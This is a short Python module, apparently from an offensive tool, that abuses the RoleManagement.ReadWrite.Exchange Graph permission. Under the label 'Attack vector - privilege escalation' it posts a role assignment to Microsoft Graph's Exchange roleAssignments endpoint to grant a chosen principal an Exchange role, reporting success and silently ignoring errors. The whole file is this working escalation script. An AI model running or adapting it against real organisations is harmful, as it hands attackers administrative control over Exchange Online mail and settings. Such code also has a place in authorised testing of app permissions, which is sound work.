import requests
import colorama
from colorama import Fore, Style


def exchange_Vectors(request_headers, exchangeSettings):
    print()
    print(
        "RoleManagement.ReadWrite.Exchange - Allows the app to read and manage the role-based access control (RBAC) settings for your organization's Exchange Online service, without a signed-in user.")
    print()
    try:
        print("Attack vector - privilege escalation")

        create_message_URL = "https://graph.microsoft.com/beta/roleManagement/exchange/roleAssignments"
        message_obj = {
            "principalId": exchangeSettings["princpalId"],
            "roleDefinitionId": exchangeSettings["roleId"],
            "directoryScopeId": "/",
            "appScopeId": "null"
        }

        result = requests.post(create_message_URL, json=message_obj, headers=request_headers)

        if result.status_code == 201:
            print(exchangeSettings["princpalId"] + " got role " + exchangeSettings["roleId"])

    except:
        pass
